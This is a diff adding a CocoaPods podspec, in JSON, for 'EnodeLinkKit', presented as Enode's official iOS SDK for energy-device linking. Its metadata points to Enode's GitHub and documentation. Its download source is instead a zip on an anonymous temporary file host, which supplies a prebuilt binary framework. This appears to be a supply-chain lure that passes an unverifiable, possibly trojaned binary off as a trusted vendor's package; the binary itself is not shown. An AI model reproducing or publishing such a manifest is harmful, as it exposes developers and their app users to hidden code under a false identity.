@@ -1,0 +1,33 @@
+{
+  "name": "EnodeLinkKit",
+  "version": "1.0.8",
+  "summary": "Enode iOS SDK for energy device linking",
+  "description": "LinkKit enables seamless integration of energy device linking capabilities\ninto iOS applications. Features include:\n- Web-based UI for device linking flows\n- WebBLE (Bluetooth Low Energy) support\n- OAuth integration for third-party authentication\n- Real-time device state tracking",
+  "homepage": "https://github.com/enode/enode-link-ios",
+  "documentation_url": "https://developers.enode.com/docs/link-sdks/ios",
+  "license": {
+    "type": "Apache-2.0",
+    "file": "LinkKit.xcframework/ios-arm64/LinkKit.framework/LICENSE"
+  },
+  "authors": {
+    "Enode": "support@enode.com"
+  },
+  "platforms": {
+    "ios": "13.1"
+  },
+  "swift_versions": "5.0",
+  "source": {
+    "http": "https://litter.catbox.moe/k3vx6n4tijz3bwru.zip"
+  },
+  "ios": {
+    "vendored_frameworks": "LinkKit.xcframework"
+  },
+  "frameworks": [
+    "CoreBluetooth",
+    "WebKit",
+    "Foundation",
+    "UIKit",
+    "Security"
+  ],
+  "swift_version": "5.0"
+}
